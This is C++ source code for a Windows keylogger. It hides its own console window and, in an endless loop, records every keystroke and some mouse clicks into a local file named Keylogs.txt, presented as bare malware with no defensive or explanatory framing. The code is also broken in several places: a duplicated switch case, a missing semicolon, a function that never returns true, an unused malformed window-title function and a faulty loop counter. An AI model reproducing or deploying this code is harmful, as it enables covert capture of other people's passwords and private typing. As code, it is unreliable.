#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <iostream>
using std::fstream;
using std::ofstream;
using namespace std;

void GetActiveWindowTitle(std::string Text()) {
    char wnd_title[256];
    HWND hwnd = GetForegroundWindow(); // get handle of currently active window
    GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << wnd_title;
    LogFile.close();
}

void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}

void Stealth() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
    switch (vKey)
    {

    case VK_CAPITAL:
        WriteData(" :Cap: ");
        break;

    case 0x0D:
        WriteData(" \n ");
        break;

    case 0x08:
        WriteData(" \b ");
        break;

    case VK_SPACE:
        WriteData(" ");
        break;

    case VK_SHIFT:
        WriteData(" *shift* ");
        break;

    case 0xBE:
        WriteData(" *fullstop* ");
        break;

    case 0xBC:
        WriteData(" *comma* ");
        break;

    case VK_LBUTTON:
        WriteData(" LB ");
        break;

    case VK_LBUTTON:
        WriteData(" RB ")
            break;

    case VK_NUMPAD0:
        WriteData(" 0 ");
        break;

    case VK_NUMPAD1:
        WriteData(" 1 ");
        break;

    case VK_NUMPAD2:
        WriteData(" 2 ");
        break;

    case VK_NUMPAD3:
        WriteData(" 3 ");
        break;

    case VK_NUMPAD4:
        WriteData(" 4 ");
        break;

    case VK_NUMPAD5:
        WriteData(" 5 ");
        break;

    case VK_NUMPAD6:
        WriteData(" 6 ");
        break;

    case VK_NUMPAD7:
        WriteData(" 7 ");
        break;

    case VK_NUMPAD8:
        WriteData(" 8 ");
        break;

    case VK_NUMPAD9:
        WriteData(" 9 ");
        break;

    case VK_MBUTTON:
        WriteData(" MMB ");
        break;

    default:
        return false;
    }
}

int main() {
    Stealth();
    char Key;
    while (1) {
        for (Key = 8; Key <= 255; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {
                if (isKeyListed(Key) == 0) {
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);
                    LogFile << Key;
                    LogFile.close();
                }
            }
        }
    }
}
